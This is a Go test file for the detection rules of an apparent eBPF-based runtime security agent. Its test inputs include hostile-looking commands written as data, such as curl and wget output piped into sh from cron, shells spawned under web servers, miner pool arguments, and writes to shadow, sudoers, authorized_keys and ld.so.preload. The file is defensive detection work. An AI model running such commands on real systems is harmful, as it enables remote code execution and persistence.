package live

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"
)

type fakeMachine struct {
	executable string
	terminal   bool
	ancestors  []string
	directory  string
}

func (m fakeMachine) Executable(uint32) string       { return m.executable }
func (m fakeMachine) HasTerminal(uint32) bool        { return m.terminal }
func (m fakeMachine) Ancestors(uint32) []string      { return m.ancestors }
func (m fakeMachine) WorkingDirectory(uint32) string { return m.directory }
func (m fakeMachine) User(uid uint32) string {
	if uid == 0 {
		return "root"
	}
	return "www-data"
}

func rules(alerts []Alert) string {
	var list []string
	for _, alert := range alerts {
		list = append(list, alert.Rule+" "+alert.Severity)
	}
	return strings.Join(list, ", ")
}

func TestExecRules(t *testing.T) {
	cases := []struct {
		name    string
		event   Event
		machine fakeMachine
		want    string
	}{
		{"program from /tmp", Event{Kind: KindExec, Path: "/tmp/.x/kworker", Parent: "sh"}, fakeMachine{}, "DG-RT-001 HIGH"},
		{"program from /dev/shm", Event{Kind: KindExec, Path: "/dev/shm/a", Parent: "bash"}, fakeMachine{}, "DG-RT-001 HIGH"},
		{"program from memory", Event{Kind: KindExec, Path: "/dev/fd/3", Parent: "python3"}, fakeMachine{executable: "/memfd: (deleted)"}, "DG-RT-001 HIGH"},
		{"ordinary program", Event{Kind: KindExec, Path: "/usr/bin/ls", Parent: "bash"}, fakeMachine{}, ""},
		{"go test's program", Event{Kind: KindExec, Path: "/tmp/go-build123/b001/x.test", Parent: "go"}, fakeMachine{}, ""},
		{"go-build name from elsewhere", Event{Kind: KindExec, Path: "/tmp/go-build123/x", Parent: "bash"}, fakeMachine{}, "DG-RT-001 HIGH"},
		{"shell under php-fpm", Event{Kind: KindExec, Path: "/bin/sh", Parent: "php-fpm8.3", Args: "sh -c id"}, fakeMachine{}, "DG-RT-002 CRITICAL"},
		{"shell under nginx", Event{Kind: KindExec, Path: "/usr/bin/bash", Parent: "nginx"}, fakeMachine{}, "DG-RT-002 CRITICAL"},
		{"shell under sshd", Event{Kind: KindExec, Path: "/usr/bin/bash", Parent: "sshd"}, fakeMachine{}, ""},
		{"postgres archive command", Event{Kind: KindExec, Path: "/bin/sh", Parent: "postgres", Args: "sh -c cp x y"}, fakeMachine{}, ""},
		{"miner by name", Event{Kind: KindExec, Path: "/usr/local/bin/xmrig", Comm: "xmrig", Parent: "bash"}, fakeMachine{}, "DG-RT-003 CRITICAL"},
		{"miner by pool", Event{Kind: KindExec, Path: "/opt/svc/worker", Comm: "worker", Parent: "bash", Args: "worker -o stratum+tcp://pool:3333"}, fakeMachine{}, "DG-RT-003 CRITICAL"},
		{"shell starting a miner", Event{Kind: KindExec, Path: "/bin/sh", Parent: "cron", Args: "sh -c ./w -o stratum+tcp://pool:3333"}, fakeMachine{}, ""},
		{"curl into sh from cron", Event{Kind: KindExec, Path: "/bin/sh", Parent: "cron", Args: "sh -c curl -fsSL http://x.example/i | sh"}, fakeMachine{}, "DG-RT-004 HIGH"},
		{"wget into sudo bash", Event{Kind: KindExec, Path: "/bin/bash", Parent: "cron", Args: "bash -c wget -qO- http://x | sudo bash -s"}, fakeMachine{}, "DG-RT-004 HIGH"},
		{"curl into sh at a terminal", Event{Kind: KindExec, Path: "/bin/sh", Parent: "bash", Args: "sh -c curl -fsSL https://get.deaconguard.io | sh"}, fakeMachine{terminal: true}, ""},
		{"curl to a file", Event{Kind: KindExec, Path: "/bin/sh", Parent: "cron", Args: "sh -c curl -o /tmp/f http://x; sha256sum /tmp/f"}, fakeMachine{}, ""},
		{"test program", Event{Kind: KindExec, Path: "/tmp/deaconguard-test-ab12", Parent: agentName}, fakeMachine{}, "DG-RT-001 LOW"},
		{"test name from another program", Event{Kind: KindExec, Path: "/tmp/deaconguard-test-ab12", Parent: "bash"}, fakeMachine{}, "DG-RT-001 HIGH"},
		{"node agent's test program", Event{Kind: KindExec, Path: "/host/tmp/deaconguard-test-ab12", Parent: agentName}, fakeMachine{}, "DG-RT-001 LOW"},
	}
	for _, c := range cases {
		alerts := Evaluate(c.event, c.machine)
		if got := rules(alerts); got != c.want {
			t.Errorf("%s: %q, want %q", c.name, got, c.want)
		}
	}
	test := Evaluate(Event{Kind: KindExec, Path: "/tmp/deaconguard-test-ab12", Parent: agentName}, fakeMachine{})
	if !test[0].Test {
		t.Errorf("test alert not marked: %+v", test)
	}
}

func TestWriteRules(t *testing.T) {
	cases := []struct {
		name    string
		event   Event
		machine fakeMachine
		want    string
	}{
		{"shadow by an unknown program", Event{Kind: KindWrite, Path: "/etc/shadow", Comm: "python3", How: HowOpen}, fakeMachine{}, "DG-RT-010 HIGH"},
		{"passwd by useradd", Event{Kind: KindWrite, Path: "/etc/passwd", Comm: "useradd", How: HowRename}, fakeMachine{}, "DG-RT-010 MEDIUM"},
		{"useradd's working copies", Event{Kind: KindWrite, Path: "/etc/passwd+", Comm: "useradd", How: HowOpen}, fakeMachine{}, ""},
		{"useradd's lock", Event{Kind: KindWrite, Path: "/etc/shadow.lock", Comm: "useradd", How: HowOpen}, fakeMachine{}, ""},
		{"useradd's backup", Event{Kind: KindWrite, Path: "/etc/group-", Comm: "useradd", How: HowOpen}, fakeMachine{}, ""},
		{"passwd by apt", Event{Kind: KindWrite, Path: "/etc/passwd", Comm: "useradd", How: HowRename}, fakeMachine{ancestors: []string{"dpkg", "apt"}}, ""},
		{"sudoers.d file", Event{Kind: KindWrite, Path: "/etc/sudoers.d/90-x", Comm: "tee", How: HowOpen}, fakeMachine{}, "DG-RT-011 HIGH"},
		{"sudoers by visudo", Event{Kind: KindWrite, Path: "/etc/sudoers", Comm: "visudo", How: HowRename}, fakeMachine{}, "DG-RT-011 MEDIUM"},
		{"visudo's working copy", Event{Kind: KindWrite, Path: "/etc/sudoers.tmp", Comm: "visudo", How: HowOpen}, fakeMachine{}, ""},
		{"sudoers.d file sudo ignores", Event{Kind: KindWrite, Path: "/etc/sudoers.d/x.bak", Comm: "tee", How: HowOpen}, fakeMachine{}, ""},
		{"vim swap file", Event{Kind: KindWrite, Path: "/etc/cron.d/.job.swp", Comm: "vim", How: HowOpen}, fakeMachine{}, ""},
		{"crontab -e working copy", Event{Kind: KindWrite, Path: "/var/spool/cron/crontabs/tmp.Xa12", Comm: "crontab", How: HowOpen}, fakeMachine{}, ""},
		{"systemd folder, not a unit", Event{Kind: KindWrite, Path: "/etc/systemd/system/notes.txt", Comm: "vim", How: HowOpen}, fakeMachine{}, ""},
		{"authorized_keys", Event{Kind: KindWrite, Path: "/home/deploy/.ssh/authorized_keys", Comm: "bash", How: HowOpen}, fakeMachine{}, "DG-RT-012 HIGH"},
		{"known_hosts", Event{Kind: KindWrite, Path: "/root/.ssh/known_hosts", Comm: "ssh", How: HowOpen}, fakeMachine{}, ""},
		{"sshd_config", Event{Kind: KindWrite, Path: "/etc/ssh/sshd_config.d/50-x.conf", Comm: "sed", How: HowRename}, fakeMachine{}, "DG-RT-012 HIGH"},
		{"cron.d", Event{Kind: KindWrite, Path: "/etc/cron.d/sysupdate", Comm: "sh", How: HowOpen}, fakeMachine{}, "DG-RT-013 HIGH"},
		{"user crontab", Event{Kind: KindWrite, Path: "/var/spool/cron/crontabs/root", Comm: "crontab", How: HowRename}, fakeMachine{}, "DG-RT-013 MEDIUM"},
		{"systemd unit", Event{Kind: KindWrite, Path: "/etc/systemd/system/x.service", Comm: "cp", How: HowOpen}, fakeMachine{}, "DG-RT-013 HIGH"},
		{"unit enabled", Event{Kind: KindWrite, Path: "/etc/systemd/system/multi-user.target.wants/x.service", Comm: "systemd", How: HowLink}, fakeMachine{}, "DG-RT-013 MEDIUM"},
		{"drop-in", Event{Kind: KindWrite, Path: "/etc/systemd/system/ssh.service.d/override.conf", Comm: "sh", How: HowOpen}, fakeMachine{}, "DG-RT-013 HIGH"},
		{"ld.so.preload", Event{Kind: KindWrite, Path: "/etc/ld.so.preload", Comm: "systemd", How: HowOpen}, fakeMachine{}, "DG-RT-013 CRITICAL"},
		{"relative passwd", Event{Kind: KindWrite, Path: "passwd", Comm: "sh", How: HowOpen}, fakeMachine{directory: "/etc"}, "DG-RT-010 HIGH"},
		{"relative passwd elsewhere", Event{Kind: KindWrite, Path: "passwd", Comm: "sh", How: HowOpen}, fakeMachine{directory: "/home/a/notes"}, ""},
		{"relative, folder gone", Event{Kind: KindWrite, Path: "ld.so.preload", Comm: "touch", How: HowOpen}, fakeMachine{}, "DG-RT-013 CRITICAL"},
		{"the agent itself", Event{Kind: KindWrite, Path: "/etc/cron.d/x", Comm: "sh", How: HowOpen}, fakeMachine{ancestors: []string{agentName}}, ""},
	}
	for _, c := range cases {
		alerts := Evaluate(c.event, c.machine)
		if got := rules(alerts); got != c.want {
			t.Errorf("%s: %q, want %q", c.name, got, c.want)
		}
	}
	gone := Evaluate(Event{Kind: KindWrite, Path: "ld.so.preload", Comm: "touch", How: HowOpen}, fakeMachine{})
	if !strings.Contains(gone[0].Detail, "a file named ld.so.preload") {
		t.Errorf("detail: %s", gone[0].Detail)
	}
}

func TestMaskSecrets(t *testing.T) {
	for in, want := range map[string]string{
		"curl -u admin:hunter2 https://x":           "curl -u admin:*** https://x",
		"mysql -pS3cret db":                         "mysql -p*** db",
		"git clone https://bob:tok3n@git.example/r": "git clone https://bob:***@git.example/r",
		"curl http://127.0.0.1:8080/x":              "curl http://127.0.0.1:8080/x",
		"app --token=abc123 --port 80":              "app --token=*** --port 80",
	} {
		if got := maskSecrets(in); got != want {
			t.Errorf("%q: %q, want %q", in, got, want)
		}
	}
}

func TestFilterValues(t *testing.T) {
	value := watchedPathValue("/home/", ".ssh/")
	if len(value) != 120 || string(value[0:6]) != "/home/" || value[48+5] != 0xff || value[48+6] != 0 || string(value[96:101]) != ".ssh/" || value[116] != filterThen {
		t.Fatalf("watched: %v", value)
	}
	name := watchedNameValue("passwd")
	if len(name) != 64 || string(name[0:6]) != "passwd" || name[32+6] != 0xff || name[32+7] != 0 {
		t.Fatalf("name: %v", name)
	}
	for _, prefix := range watchedPrefixes {
		if len(prefix) > 48 {
			t.Errorf("prefix over 48 bytes: %s", prefix)
		}
	}
	if len(watchedPrefixes)+1 > 24 || len(watchedNames) > 16 {
		t.Errorf("more filters than the watchers hold")
	}
}

func TestObject(t *testing.T) {
	object, err := ParseObject(watchObject)
	if err != nil {
		t.Fatal(err)
	}
	if object.License != "Dual MIT/GPL" || len(object.Programs) != 13 || len(object.Maps) != 8 {
		t.Fatalf("object: %s, %d programs, %d maps", object.License, len(object.Programs), len(object.Maps))
	}
	linked, err := object.Programs[0].Linked(map[string]int{"scratch": 7, "pending_execs": 8})
	if err != nil {
		t.Fatal(err)
	}
	for slot := range object.Programs[0].MapRefs {
		if linked[slot*8+1]>>4 != 1 || linked[slot*8+4] < 7 {
			t.Errorf("slot %d not linked", slot)
		}
	}
}

func TestDetectorLimits(t *testing.T) {
	d := NewDetector("", t.Logf)
	now := time.Now()
	alert := Alert{Rule: RuleTempProgram, Program: "/tmp/x", Parent: "sh"}
	d.add([]Alert{alert, alert, alert}, now)
	if _, alerts := d.Take(); len(alerts) != 1 {
		t.Fatalf("dedupe: %d", len(alerts))
	}
	d.add([]Alert{alert}, now.Add(dedupeWindow+time.Second))
	if _, alerts := d.Take(); len(alerts) != 1 || alerts[0].Repeats != 2 {
		t.Fatalf("repeats: %+v", alerts)
	}
	var many []Alert
	for i := range 40 {
		many = append(many, Alert{Rule: RuleTempProgram, Program: fmt.Sprintf("/tmp/%d", i)})
	}
	later := now.Add(time.Hour)
	d.add(many, later)
	status, alerts := d.Take()
	if len(alerts) != maxAlertsPerMinute || status.Suppressed != 10 {
		t.Fatalf("rate limit: %d alerts, %d suppressed", len(alerts), status.Suppressed)
	}
	d.count(100, later)
	d.count(150, later)
	if status, _ := d.Take(); status.EventsLastHour != 150 {
		t.Fatalf("events: %d", status.EventsLastHour)
	}
}

func TestParseEvent(t *testing.T) {
	raw := make([]byte, eventSize)
	raw[0] = KindExec
	raw[4] = 42
	copy(raw[40:], "sh")
	copy(raw[56:], "nginx")
	copy(raw[72:], "/bin/sh")
	copy(raw[328:], "sh -c id ")
	raw[36] = 9
	event, err := ParseEvent(raw)
	if err != nil || event.PID != 42 || event.Comm != "sh" || event.Parent != "nginx" || event.Path != "/bin/sh" || event.Args != "sh -c id" {
		t.Fatalf("%+v %v", event, err)
	}
	if _, err := ParseEvent(raw[:100]); err == nil {
		t.Fatal("short event accepted")
	}
}

// The embedded watchers must be built from the C source as it is: rebuild
// them with scripts/build-bpf.sh after changing bpf/watch.c.
func TestObjectUpToDate(t *testing.T) {
	source, err := os.ReadFile("bpf/watch.c")
	if err != nil {
		t.Fatal(err)
	}
	recorded, err := os.ReadFile("watch.sum")
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(source)
	if strings.TrimSpace(string(recorded)) != hex.EncodeToString(sum[:]) {
		t.Fatal("watch.o is older than bpf/watch.c: run sh scripts/build-bpf.sh")
	}
}
